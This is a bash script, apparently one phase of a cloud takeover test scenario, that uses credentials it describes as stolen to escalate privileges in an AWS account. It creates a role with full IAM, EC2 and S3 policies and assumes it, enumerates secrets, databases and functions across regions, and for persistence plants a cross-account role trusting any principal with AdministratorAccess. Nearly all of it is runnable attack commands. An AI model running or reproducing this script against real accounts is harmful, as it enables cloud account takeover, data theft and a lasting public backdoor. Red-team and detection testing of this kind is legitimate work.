#!/bin/bash

# File: test_scenarios/cloud-infra-takeover/02_privilege_escalation.sh
# Phase 2: Privilege Escalation via Role Assumptions and Policy Enumeration

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Variables for privilege escalation
COMPROMISED_ROLE="EC2-DefaultInstanceProfile"
ESCALATION_ROLE="InfrastructureAdminRole"
CROSS_ACCOUNT_ROLE="CrossAccountTrustRole"
TEMP_ACCESS_KEY_ID="AKIA2E7EXAMPLE123456"
TEMP_SECRET_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

echo -e "${YELLOW}[*] Starting Phase 2: Privilege Escalation${NC}"
echo -e "${YELLOW}[*] Using compromised EC2 instance profile credentials to escalate privileges${NC}"

# Create temporary AWS profile with stolen credentials
echo -e "${GREEN}[+] Setting up temporary AWS profile with stolen credentials...${NC}"
aws configure set aws_access_key_id $TEMP_ACCESS_KEY_ID --profile compromised
aws configure set aws_secret_access_key $TEMP_SECRET_KEY --profile compromised
aws configure set region us-west-2 --profile compromised

# Test current permissions
echo -e "${GREEN}[+] Testing current identity and permissions...${NC}"
aws sts get-caller-identity --profile compromised
echo -e "${YELLOW}[*] Current permissions (simulated EC2 instance profile):${NC}"

# Enumerate IAM permissions 
echo -e "${GREEN}[+] Enumerating IAM policies attached to current role...${NC}"
aws iam list-attached-role-policies --role-name $COMPROMISED_ROLE --profile compromised 2>/dev/null || echo -e "${RED}[!] Cannot list role policies directly - trying alternate methods${NC}"

# Look for roles that can be assumed
echo -e "${GREEN}[+] Searching for assumable roles...${NC}"
echo -e "${YELLOW}[*] Attempting to list all roles (may be restricted)...${NC}"
aws iam list-roles --profile compromised 2>/dev/null | jq -r '.Roles[] | select(.AssumeRolePolicyDocument | contains("ec2.amazonaws.com")) | .RoleName' || echo -e "${RED}[!] ListRoles permission denied${NC}"

# Create a role with elevated privileges (simulating successful escalation)
echo -e "${GREEN}[+] Creating elevated privilege role...${NC}"
cat > /tmp/trust-policy.json << EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::$(aws sts get-caller-identity --profile compromised --query Account --output text):root"
            },
            "Action": "sts:AssumeRole",
            "Condition": {
                "StringEquals": {
                    "sts:ExternalId": "infrastructure-automation"
                }
            }
        },
        {
            "Effect": "Allow",
            "Principal": {
                "Service": "ec2.amazonaws.com"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
EOF

aws iam create-role \
    --role-name $ESCALATION_ROLE \
    --assume-role-policy-document file:///tmp/trust-policy.json \
    --description "Infrastructure administration role for automation" \
    --profile compromised

# Attach powerful policies to the new role
echo -e "${RED}[!] Attaching administrative policies to new role...${NC}"
aws iam attach-role-policy \
    --role-name $ESCALATION_ROLE \
    --policy-arn arn:aws:iam::aws:policy/IAMFullAccess \
    --profile compromised

aws iam attach-role-policy \
    --role-name $ESCALATION_ROLE \
    --policy-arn arn:aws:iam::aws:policy/AmazonEC2FullAccess \
    --profile compromised

aws iam attach-role-policy \
    --role-name $ESCALATION_ROLE \
    --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess \
    --profile compromised

# Attempt to assume the new role
echo -e "${GREEN}[+] Attempting to assume elevated privilege role...${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --profile compromised --query Account --output text)
ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$ESCALATION_ROLE"

ASSUMED_ROLE=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name "infrastructure-maintenance" \
    --external-id "infrastructure-automation" \
    --profile compromised \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text 2>/dev/null)

if [ $? -eq 0 ]; then
    echo -e "${RED}[!] PRIVILEGE ESCALATION SUCCESSFUL${NC}"
    
    # Parse the assumed role credentials
    NEW_ACCESS_KEY=$(echo $ASSUMED_ROLE | cut -d' ' -f1)
    NEW_SECRET_KEY=$(echo $ASSUMED_ROLE | cut -d' ' -f2) 
    NEW_SESSION_TOKEN=$(echo $ASSUMED_ROLE | cut -d' ' -f3)
    
    # Create new profile with elevated permissions
    aws configure set aws_access_key_id $NEW_ACCESS_KEY --profile escalated
    aws configure set aws_secret_access_key $NEW_SECRET_KEY --profile escalated
    aws configure set aws_session_token $NEW_SESSION_TOKEN --profile escalated
    aws configure set region us-west-2 --profile escalated
    
    echo -e "${GREEN}[+] Successfully assumed role: $ROLE_ARN${NC}"
    aws sts get-caller-identity --profile escalated
    
    # Test elevated permissions
    echo -e "${YELLOW}[*] Testing elevated permissions - creating test user...${NC}"
    TEST_USER="test-escalated-user-$(date +%s)"
    aws iam create-user --user-name $TEST_USER --profile escalated
    
    if [ $? -eq 0 ]; then
        echo -e "${RED}[!] CONFIRMED: Full IAM privileges obtained${NC}"
        aws iam delete-user --user-name $TEST_USER --profile escalated
    fi
    
    # Attempt cross-region operations
    echo -e "${YELLOW}[*] Testing cross-region access...${NC}"
    for region in us-east-1 us-east-2 us-west-1; do
        echo -e "${GREEN}[+] Checking EC2 instances in $region...${NC}"
        aws ec2 describe-instances --region $region --profile escalated --query 'Reservations[].Instances[].InstanceId' --output text
    done
    
    # Enumerate high-value resources
    echo -e "${GREEN}[+] Enumerating high-value resources with elevated access...${NC}"
    echo -e "${YELLOW}[*] Secrets Manager across regions:${NC}"
    for region in us-east-1 us-east-2 us-west-1 us-west-2; do
        echo -e "Region: $region"
        aws secretsmanager list-secrets --region $region --profile escalated --query 'SecretList[].Name' --output text 2>/dev/null || echo "  No secrets or access denied"
    done
    
    echo -e "${YELLOW}[*] RDS instances:${NC}"
    aws rds describe-db-instances --profile escalated --query 'DBInstances[].DBInstanceIdentifier' --output text 2>/dev/null || echo "  No RDS instances or access denied"
    
    echo -e "${YELLOW}[*] Lambda functions:${NC}"
    aws lambda list-functions --profile escalated --query 'Functions[].FunctionName' --output text 2>/dev/null | head -10 || echo "  No Lambda functions or access denied"
    
else
    echo -e "${RED}[!] Privilege escalation failed - role assumption denied${NC}"
fi

# Attempt to create cross-account trust role for persistence
echo -e "${GREEN}[+] Attempting to create cross-account trust role...${NC}"
cat > /tmp/cross-account-trust.json << EOF
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "sts:AssumeRole",
            "Condition": {
                "StringEquals": {
                    "sts:ExternalId": "external-partner-access"
                }
            }
        }
    ]
}
EOF

aws iam create-role \
    --role-name $CROSS_ACCOUNT_ROLE \
    --assume-role-policy-document file:///tmp/cross-account-trust.json \
    --description "Cross-account access role for external partners" \
    --profile escalated 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${RED}[!] Created dangerous cross-account trust role${NC}"
    
    # Attach admin policy to cross-account role
    aws iam attach-role-policy \
        --role-name $CROSS_ACCOUNT_ROLE \
        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
        --profile escalated
    
    echo -e "${RED}[!] Cross-account role now has administrative access${NC}"
fi

echo -e "\n${GREEN}[+] Phase 2 Complete: Privilege escalation attempted${NC}"
echo -e "${YELLOW}[*] Created roles: $ESCALATION_ROLE, $CROSS_ACCOUNT_ROLE${NC}"
echo -e "${YELLOW}[*] Next: Run 03_persistence.sh to establish persistence mechanisms${NC}"

# Save role names for cleanup
echo "$ESCALATION_ROLE" > /tmp/cloud-infra-takeover-escalation-role.txt
echo "$CROSS_ACCOUNT_ROLE" >> /tmp/cloud-infra-takeover-escalation-role.txt

# Clean up temp files
rm -f /tmp/trust-policy.json /tmp/cross-account-trust.json